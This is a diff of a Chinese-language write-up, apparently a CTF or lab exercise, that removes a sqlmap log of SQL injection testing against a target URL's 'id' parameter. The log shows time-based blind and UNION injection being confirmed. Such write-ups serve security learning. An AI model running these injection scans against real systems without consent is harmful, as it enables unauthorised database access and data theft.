@@ -47,44 +47,6 @@ url=`http://hackattack.cn:1227/Va41IcUZk47qSxlUmgJuDe681ryyBajc/?id=1`
 由于跑完的数据库名和表名过多无法以截图展示，这里就以代码块的形式展现出来
 
 ```
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 10:09:41 /2023-04-19/
-
-[10:09:41] [INFO] purging content of directory '/root/.local/share/sqlmap'...
-[10:09:41] [INFO] testing connection to the target URL
-[10:09:41] [INFO] checking if the target is protected by some kind of WAF/IPS
-[10:09:41] [INFO] testing if the target URL content is stable
-[10:09:42] [INFO] target URL content is stable
-[10:09:42] [INFO] testing if GET parameter 'id' is dynamic
-[10:09:42] [WARNING] GET parameter 'id' does not appear to be dynamic
-[10:09:42] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
-[10:09:42] [INFO] testing for SQL injection on GET parameter 'id'
-[10:09:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[10:09:42] [WARNING] reflective value(s) found and filtering out
-[10:09:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
-[10:09:42] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
-[10:09:43] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
-[10:09:43] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
-[10:09:43] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
-[10:09:43] [INFO] testing 'Generic inline queries'
-[10:09:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
-[10:09:43] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
-[10:09:43] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
-[10:09:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
-[10:09:54] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
-
-for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]                                                                                                               
-[10:10:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                                                                                                                                    
-[10:10:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found                                                                                       
-[10:10:51] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                          
-[10:10:51] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')                                                                                                                                                  
-[10:10:51] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test               
-[10:10:52] [INFO] target URL appears to have 3 columns in query                                                                                                                                                                             
-[10:10:52] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                                                                                                                                           
-GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
-sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
----
 Parameter: id (GET)
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
